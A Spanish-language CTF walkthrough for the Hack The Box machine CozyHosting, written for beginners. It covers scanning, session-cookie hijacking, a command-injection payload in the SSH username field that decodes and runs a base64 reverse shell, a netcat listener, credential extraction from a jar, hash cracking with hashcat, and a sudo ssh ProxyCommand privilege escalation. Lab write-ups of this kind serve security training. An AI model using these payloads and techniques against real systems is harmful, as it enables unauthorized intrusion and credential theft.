# Guía de CozyHosting
![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/435b71f8-991f-49d3-a522-834223f67536)

En este repositorio, buscamos explicar paso a paso la búsqueda de las banderas del reto CozyHosting de HackTheBox. 
He creado esto para las personas nuevas en el mundo del hacking ético para que no se sientan abrumadas por tantos conceptos. Hay varios conceptos importantes y herramientas que son muy útiles.

Dentro del rato sabemos que hay dos banderas. La primera esta en usario y la segunda en root. Esta es la unica informacion que tenemos.
Lo primero que haremos es identificar la máquina que querremos atacar, que en este caso es CozyHosting. Esta tiene la siguiente información:

- **IP: 10.10.11.230**
  Con esta información, procedemos a agregarla a nuestra lista de hosts para poder acceder a su sitio web.

## Editar el archivo /etc/hosts

Para comenzar, necesitamos editar nuestro archivo `/etc/hosts` utilizando el siguiente comando:

```
sudo nano /etc/hosts
```

- **`sudo`**: "sudo" es un comando en sistemas Unix y Linux que significa "superusuario do". Permite a un usuario ejecutar un comando con privilegios elevados, generalmente como el superusuario o administrador del sistema. El uso de "sudo" es necesario para editar archivos que requieren permisos de administrador, como el archivo `/etc/hosts`.

- **`nano`**: "nano" es un editor de texto en la línea de comandos. Es una herramienta simple y fácil de usar para editar archivos de texto en la terminal. En este caso, se utiliza para abrir y editar el archivo `/etc/hosts`.

- **`/etc/hosts`**: "/etc/hosts" es la ruta completa al archivo que estás tratando de abrir y editar. Este archivo es importante porque se utiliza para resolver nombres de host a direcciones IP en sistemas Unix y Linux. Cuando tu computadora intenta acceder a un sitio web o un recurso en la red, primero verifica si la dirección IP correspondiente está en este archivo antes de recurrir a un servidor DNS público. Agregar entradas en este archivo te permite personalizar la resolución de nombres en tu sistema local.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/856ef6b8-7ca9-41b1-85d2-c73c7b9f8cdd)

**Una vez dentro, procedemos a agregar nuestra IP junto con la URL.**

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e9507dcf-d020-4aad-95be-1508f01a9262)

*(para guardar con Ctrl+O, Ctrl+X, yes, te preguntará si quieres cambiar el nombre, simplemente dale enter)*

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/59792084-eb50-4ae9-939a-b4095ad38a13)

*Para comprobar que hicimos todo bien, podemos entrar a http://cozyhosting.htb. En resumen, utilizar el comando "sudo nano /etc/hosts" es importante para personalizar la resolución de nombres en tu sistema local y permitirte acceder a máquinas o servicios específicos en entornos de CTF como Hack The Box, donde es común que los nombres de host y direcciones IP se utilicen de manera no convencional.*

## Ifconfig 
- Antes de todo, debemos saber nuestra IP para futuros pasos que haremos en la guía.
```
ifconfig
```
- De toda la información, lo que nos importa es la que dice "inet". Apunta esa IP; debería empezar con 10.10...

## NMAP
```
nmap -sS -sV -p- 10.10.11.230 -o cozyhosting
```
- **`Identificación de puertos abiertos (-p-)`**: La opción -p- le indica a Nmap que escanee todos los puertos posibles en el rango completo (1-65535). Esto es importante porque, en muchos casos, no sabes qué puertos pueden estar abiertos en la máquina objetivo. Al escanear todos los puertos, te aseguras de no pasar por alto ningún servicio o aplicación que pueda estar en ejecución.
- **Escaneo de tipo SYN (-sS)**: El escaneo de tipo SYN es una técnica sigilosa y menos intrusiva. Envía paquetes SYN a los puertos y espera respuestas. Si recibe una respuesta SYN/ACK, significa que el puerto está abierto. Si recibe un RST (restablecimiento) en respuesta, el puerto está cerrado. Este tipo de escaneo es útil para determinar la accesibilidad de los puertos sin establecer completamente una conexión, lo que podría dejar rastros en el servidor objetivo.

- **Detección de servicios y versiones (-sV)**: La opción -sV permite que Nmap intente detectar el servicio que se está ejecutando en un puerto y, en algunos casos, incluso la versión específica del software. Esto es útil para identificar qué servicios están en funcionamiento en la máquina objetivo y conocer las vulnerabilidades asociadas a esas versiones específicas.

- **Generación de un informe de resultados (-o)**: Al utilizar la opción -o seguida de un nombre de archivo, puedes generar un informe de resultados que contiene los detalles del escaneo. Esto te permite registrar la información que obtuviste y revisarla posteriormente. Además, es útil para documentar tu progreso y compartir información con otros miembros de tu equipo en CTF.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b43b57da-65ea-4b44-8ae8-1c43d3c69ccd)

- **Resultado (-o)**: Realizar un escaneo Nmap con las opciones -sS -sV -p- en la dirección IP 10.10.11.230 es importante en la fase de reconocimiento y enumeración de un CTF (Capture The Flag) en Hack The Box o en cualquier otro entorno de pruebas de penetración.

## Dirsearch
```shell
dirsearch -u http://cozyhosting.htb/
```

- **Detección de rutas**: Esta herramienta se utiliza para buscar posibles rutas y recursos accesibles en un sitio web o servidor web.

- **Si tienes problemas con Dirsearch**: Sigue los siguientes comandos si Kali te niega la instalación:
  ```shell
  git clone https://github.com/maurosoria/dirsearch.git
  ```
  ```shell
  cd dirsearch
  ```
  ```shell
  python3 dirsearch.py -u http://cozyhosting.htb/
  ```
- Una vez finalizado el trabajo con Dirsearch, obtendrás un resultado como este:
![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/4869a22d-4963-4b92-85ed-0fa89b44fc11)

- Analizamos y encontramos la siguiente ruta:
![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c3df4a7e-dfb8-4fff-9b24-f90132d437d8)
- Accederemos a ella utilizando la URL que ya teníamos de CozyHosting. Lo que vemos son las sesiones y notamos que la de Kanderson es la única que no dice "no autorizado" y con una cookie que usaremos para engañar al inicio de sesión.
![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/76305964-d943-4ac7-ac57-8df637e72b75)
- Leyendo todo lo que nos arrojó, nos interesa:
 ```
 http://cozyhosting.htb/actuator/sessions
 ```
 ```
http://cozyhosting.htb/admin
 ```


## Inyección de Cookies

La inyección de cookies es un método que nos permite acceder al panel utilizando información previamente obtenida. Pero, ¿qué significa exactamente inyección de cookies? Se trata de una técnica que implica la manipulación maliciosa o indebida de las cookies en una aplicación web. Las cookies son pequeños fragmentos de datos que un servidor web envía al navegador del usuario para almacenar información, como sesiones de usuario, preferencias y estados de autenticación. Cuando las cookies no se manejan adecuadamente, pueden surgir vulnerabilidades que permiten a un atacante inyectar o modificar cookies para obtener acceso no autorizado o realizar ataques dirigidos.

A continuación, te explicaré cómo realizar la inyección de cookies paso a paso:

1. **Obtención de Datos**: El primer paso es obtener la información necesaria para llevar a cabo la inyección de cookies. En tu caso, esta información proviene de [http://cozyhosting.htb/actuator/sessions](http://cozyhosting.htb/actuator/sessions).

2. **Acceso al Panel**: Una vez que tengas los datos requeridos, dirígete a [http://cozyhosting.htb/admin](http://cozyhosting.htb/admin). Esta URL se obtuvo en el paso anterior. *Intenta iniciar sesion para que las cookies se generen, pon un usariop y contraseña erronia* 

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3c771f04-ef6a-4945-b340-6d6ca45bef60)

3. **Inspección del Código**: Luego, inspecciona el código de la página y busca la opción de "Storage" en las herramientas de desarrollo del navegador.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/410902b4-cd14-456c-aa82-9a0b843073bf)

4. **Reemplazo de Cookies**: Dentro de la opción "Storage", reemplaza el valor existente por el que obtuviste en el paso 1, tanto en la URL [http://cozyhosting.htb/actuator/sessions](http://cozyhosting.htb/actuator/sessions) como en la cookie de Kanderson.

5. **Actualización de la Página**: Después de agregar la información, refresca la página.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e6f834a9-6cee-4b8c-b18f-11f37db5d4f6)

6. **Inicio de Sesión Falso**: Ahora, ingresa un usuario y contraseña que sean idénticos en ambos campos. Por ejemplo, Usuario: 123 Contraseña: 123.

7. **Acceso Exitoso**: Si todos los pasos se realizaron correctamente, ahora deberías tener acceso al panel.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/94d52f93-8cc9-4b48-841d-19d6952e00f8)

Siguiendo estos pasos, podrás llevar a cabo una inyección de cookies de manera efectiva.


## Burp Suite

Ahora que hemos completado los pasos anteriores, es el momento de escuchar las solicitudes y respuestas del sitio web. Para esta tarea, utilizaremos la herramienta Burp Suite. Esta herramienta nos permite interceptar y analizar el tráfico web que pasa a través de un proxy. Para empezar, necesitamos configurar nuestro navegador web para que utilice Burp Suite como proxy. Aquí tienes los pasos a seguir:

### Cambiar el puerto del proxy en el navegador

Burp Suite normalmente escucha en la dirección IP 127.0.0.1 y el puerto 8080. Para que nuestro navegador se comunique con Burp Suite, debemos configurar las siguientes opciones:

1. Abre tu navegador web, en este caso, utilizaremos Firefox para la configuración.

2. Ve a la configuración del navegador. En Firefox, puedes acceder a la configuración haciendo clic en el icono de tres líneas horizontales en la esquina superior derecha y seleccionando "Opciones".

3. En la página de configuración, desplázate hacia abajo hasta encontrar la sección "Red Proxy". Haz clic en la opción "Configuración" que se encuentra en la parte derecha.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7b2d3b5c-90f8-4eb4-8db1-e471dbce261a)

4. En la ventana de configuración del proxy, selecciona la opción "Configuración manual de proxy". Luego, ingresa la dirección IP 127.0.0.1 en el campo "Servidor" y el puerto 8080 en el campo "Puerto".

5. Asegúrate de que la casilla de verificación "Usar esta configuración para todos los protocolos" esté marcada.

6. Haz clic en "Aceptar" para guardar la configuración.

### Comprobar el funcionamiento con Burp Suite

Ahora que hemos configurado nuestro navegador para utilizar Burp Suite como proxy, podemos realizar pruebas para asegurarnos de que todo funcione correctamente. Puedes repetir el paso anterior, pero esta vez con Burp Suite activado, para ver cómo intercepta y muestra el tráfico web.

Para ver el tráfico que pasa a través del proxy en Burp Suite, sigue estos pasos:

1. Abre Burp Suite y ve a la pestaña "Proxy".

2. Asegúrate de que el botón naranja en la parte superior, que dice "Interceptar", esté activado ("on").

Siguiendo estos pasos, podrás utilizar Burp Suite para interceptar y analizar el tráfico web que pasa a través de tu navegador. Esto es fundamental para llevar a cabo pruebas de seguridad y análisis de vulnerabilidades en aplicaciones web.


## Inyección de Shell o Shell Reverso

Si examinamos la página, notaremos que hay una sección de SSH, lo que nos da la oportunidad de acceder directamente a su servicio mediante una inyección de shell y Burp Suite.

**¿Qué es la inyección de shell?**: La inyección de comandos se refiere a una vulnerabilidad en la que un atacante puede insertar comandos maliciosos o instrucciones en una entrada de datos que luego se ejecutan en el sistema objetivo a través de una conexión SSH u otro protocolo.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/da3f192a-28e4-4ff4-9754-1c15cdcf9e9a)

Procedemos de la siguiente manera:

1. Rellenamos los siguientes campos:
   - Hostname:
     ```
     127.0.0.1
     ```
   - Usuario:
     ```
     Kanderson
     ```

Una vez ingresados los datos, continuamos con Burp Suite.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a5e664ab-e645-4cb0-9b37-4a4b20dcf342)

A continuación, activamos el "Repeater" presionando `Ctrl + R`.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/f4ec75dc-cad5-4aef-814d-7e54783743a2)

Lo que vamos a hacer es un shell reverso. Accedemos a esta URL [https://www.revshells.com/](https://www.revshells.com/) y proporcionamos la dirección IP que obtuvimos del comando `ifconfig`, así como el puerto 4444 que utilizaremos para conectarnos al SSH.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/f1bf208e-2043-41a4-ae39-bee4d87d78a3)

Asegurémonos de que esté codificado en Base64.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/6e5e98e0-058e-439c-bd04-f6fcd84826c2)

Con esto, decodificamos en:

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/1a13d55e-5e29-4b85-a7c2-1bd67768bf76)

Copiamos todo el resultado y lo insertamos en la siguiente cadena:

```
kanderson;echo${IFS}"ELNUMEROQUETEDIO_NOBORRESLASCOMILLAS"|base64${IFS}-d|bash;
```
- echo se utiliza para imprimir texto en la salida estándar.

- ${<IFS} representa un espacio en blanco o un carácter de espacio en blanco, que se usa para separar elementos en un comando.
- | se utiliza para redirigir la salida del comando anterior a la entrada del siguiente comando.
- base64${IFS}-d se utiliza para decodificar una cadena en formato Base64. Esto podría ser para decodificar el número de puerto y la dirección IP proporcionados entre las comillas.
- | nuevamente redirige la salida.
- bash; ejecuta un intérprete de comandos Bash para ejecutar comandos adicionales.

- "ELNUMEROQUETEDIO_NOBORRESLASCOMILLAS" es un marcador para que el usuario ingrese su propia dirección IP y número de puerto entre las comillas. Esto se usa para que el atacante pueda especificar la dirección IP y el puerto al que se conectará el sistema comprometido.
Luego, pegamos esta cadena en Burp Suite.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c707a2c2-1b47-4c57-9908-be49db5042ef)

Enviamos la solicitud y abrimos una terminal en nuestro sistema con el siguiente comando:

```
nc -lnvp 4444
```
- nc -lnvp 4444 - Este comando escucha el puerto (4444) utilizando netcat (nc) en modo de escucha (-l) y con opción de conexión persistente (-n y -v) para permitir que el atacante se conecte al sistema comprometido.

Si todo ha salido bien, deberíamos ver algo como esto:

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b9ba4dc9-de16-48bf-8012-ff862837a6b9)

Podemos verificar los archivos disponibles utilizando el comando `ls`. Observamos que hay un archivo Jar.

*Nota: El puerto puede variar según las preferencias del usuario y lo que se descubra durante el proceso.*


-Les adjunto un digrama del proceso
![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/ea2db25e-cf90-4755-a429-40081364228a)



Siguiendo estos pasos, podemos realizar una inyección de shell o shell reverso para acceder al sistema de destino de manera efectiva.




## Cloudhosting.jar y Unzip

**¿Qué es `unzip`?**: `unzip` es un comando utilizado en sistemas Unix y Linux para descomprimir archivos en formato ZIP. Los archivos ZIP son archivos comprimidos que pueden contener uno o varios archivos o directorios comprimidos en un solo archivo. El comando `unzip` se utiliza para extraer el contenido de estos archivos comprimidos, restaurándolos a su estado original.

Ahora, continuemos con el proceso:

1. Comenzamos revisando el archivo `cloudhosting-0.0.1.jar`.

2. Si intentamos descomprimirlo utilizando el comando `unzip`, se nos negará el acceso. Por lo tanto, seguiremos estos pasos alternativos:

   - Primero, configuramos un servidor HTTP local con el siguiente comando:

   ```
   python3 -m http.server 9999
   ```

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3e934152-8fd5-4c8d-b735-7909e71dd2ed)

   - Luego, descargamos el archivo `cloudhosting-0.0.1.jar` desde el servidor local que hemos creado:

   ```
   wget cozyhosting.htb:9999/cloudhosting-0.0.1.jar
   ```

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/31e078e6-9f58-4294-b57e-a797431a6921)

   - A continuación, descomprimimos el archivo `cloudhosting-0.0.1.jar` con el comando `unzip`:

   ```
   unzip cloudhosting-0.0.1.jar
   ```

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/513fb33c-ad7a-4da0-8a56-d63ab85ca38f)

3. Después de descomprimirlo, ejecutamos el comando `ls` para ver los archivos y carpetas extraídos.

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/aaf2119a-0852-46a7-8f8d-090705b21995)

   *Ten en cuenta que puede haber más archivos, pero lo importante son las carpetas.Yo tengo varios Cloudhosting.jar porque lo hice varias veces*

4. A continuación, revisamos los archivos buscando usuarios utilizando el siguiente comando:

   ```
   grep -r username
   ```

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/00229160-234f-4951-b91e-d3fd16346c00)

5. De los resultados, nos interesa la siguiente información:

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/56229dfb-1169-4f7c-8786-8731e916ea79)

6. Para obtener más detalles, podemos examinar el contenido del archivo `BOOT-INF/classes/application.properties` utilizando el comando:

   ```
   cat BOOT-INF/classes/application.properties
   ```

   ![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c1841dbe-10dc-4d13-b2a2-49d23b756461)

   Identificamos la siguiente información útil:

   - `spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting`
   - `username=postgres`
   - `password=Vg&nvzAQ7XxR`

Con esta información, estamos listos para continuar con los siguientes pasos.


## PostgreSQL

Volvemos al SSH para continuar con el siguiente paso.

**Nota:** Para detener el servidor HTTP local en el puerto 9999, simplemente presiona `Ctrl + C`. Luego, asegúrate de tener el servidor SSH nuevamente en ejecución y envía lo que tenías en Burp para volver a iniciar la conexión SSH, en caso de que te hayas confundido.

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/44ed47b9-d9f0-487d-980a-8213835dd902)

A continuación, accedemos a PostgreSQL utilizando el siguiente comando:

```
psql -h localhost -d cozyhosting -U postgres
```

Se te pedirá una contraseña, que corresponde a la que obtuvimos en el paso anterior: "password=Vg&nvzAQ7XxR".

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/4810f169-f79f-495e-aaa5-943e17817eef)

Luego de ingresar la contraseña correctamente, accedemos al entorno de PostgreSQL.

Para verificar las bases de datos disponibles, ejecutamos el comando:

```
\l
```

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/2c29a57a-844a-43dc-9dfc-bc23771bf364)

Si bien podemos ver las bases de datos, no es lo que estamos buscando.

Para listar las tablas en la base de datos actual, utilizamos el comando:

```
\d
```

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/9f9f1481-2d16-4ce9-8175-d94ce6a475ef)

Ya con esta información, salimos de la visualización de tablas escribiendo "q" y presionando "Enter".

Ahora, ejecutamos la siguiente consulta SQL para obtener lo que necesitamos:

```
SELECT * FROM users;
```

![imagen](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7bb1b99b-931f-4296-a0db-41b7a68a2c11)

Hemos obtenido la información que necesitábamos; sin embargo, debemos tener en cuenta que las contraseñas están en formato hash.


## Hashcat

**¿Qué es Hashcat?**: Hashcat es una potente herramienta de código abierto diseñada para realizar ataques de fuerza bruta y recuperar contraseñas de hashes. Es ampliamente utilizado en el campo de la seguridad informática y la auditoría de seguridad para probar la resistencia de las contraseñas y evaluar la seguridad de sistemas y aplicaciones.

A continuación, te recomiendo descargar una wordlist para la fuerza bruta con el siguiente comando:

```
git clone https://github.com/danielmiessler/SecLists.git
```

Luego, busca en la carpeta raíz de la descarga el archivo llamado "rockyou.txt" y extráelo en tu escritorio.

Lo siguiente que haremos es copiar la contraseña hasheada y pegarla en un archivo llamado "hashes". El comando se verá así:

```
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hashes
```

Después, ejecutamos Hashcat para realizar el ataque de fuerza bruta con el siguiente comando:

```
hashcat -m 3200 hashes --wordlist /home/kali/Desktop/rockyou.txt --force
```

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/0334ed88-e849-4515-baef-53f0332a916c)

Una vez que Hashcat haya finalizado, podemos mostrar la contraseña encontrada con el siguiente comando:

```
hashcat -m 3200 hashes --wordlist /home/kali/Desktop/rockyou.txt --force --show
```

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3f6c9749-8fe9-4423-8dc4-01b10b538490)

Hemos obtenido la contraseña, que es "manchesterunited".

Ahora necesitamos encontrar el nombre de usuario. Para ello, regresamos a la terminal SSH.

No salimos de la tabla de la base de datos, simplemente escribimos "q" y presionamos "Enter".

Luego, navegamos a la carpeta `/home` con el siguiente comando:

```
cd /home
```

Ejecutamos `ls` para listar los usuarios en el sistema.

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b0f1ed1c-8fc0-43c5-8e4e-09e4f3850efd)

Hemos encontrado que el nombre de usuario es "josh".

Entonces, el nombre de usuario es "josh" y la contraseña es "manchesterunited".

## Parte final

Nos basamos en una estructura común de SSH para acceder. Sabemos que la dirección IP de la máquina que estamos atacando es 10.10.11.230, por lo que escribimos el siguiente comando para iniciar una conexión SSH:

```
ssh josh@10.10.11.230
```

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/fa81870d-09ea-46cd-92ce-6f3226d16c68)

Luego, ingresamos la contraseña que encontramos, "manchesterunited", y ahora estamos dentro.

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/680b8a1b-7464-46e1-ad95-b46b923f758c)

Para finalizar, ahora podemos buscar las banderas. Ejecutamos el siguiente comando para ver qué carpetas existen en la máquina:

```
sudo -l
```

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/2d258608-93f8-4a04-b62b-7589f0aee715)

Aunque tenemos acceso, no tenemos todas las libertades. Para obtener más libertad, ejecutamos el siguiente comando. Este es un comando ProxyCommand que ejecuta una shell en segundo plano con entradas y salidas redirigidas, lo que nos da la libertad de acceder a donde queramos.

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Ahora escribimos el comando `whoami`, que simplemente muestra el nombre del usuario actualmente conectado. Cuando se ejecuta después de establecer una conexión SSH, muestra el nombre de usuario con el que te has autenticado a través de SSH en el sistema remoto:

```
whoami
```

Para encontrar las banderas, utilizamos los siguientes comandos:

```
cat /root/root.txt
```

```
ls
```

```
cat user.txt
```

Banderas encontradas:

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/8851bdf8-2e18-4c2f-bd7e-80e37910aea5)

![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a0d256da-f3a4-4c78-9160-557c8fe4fb11)



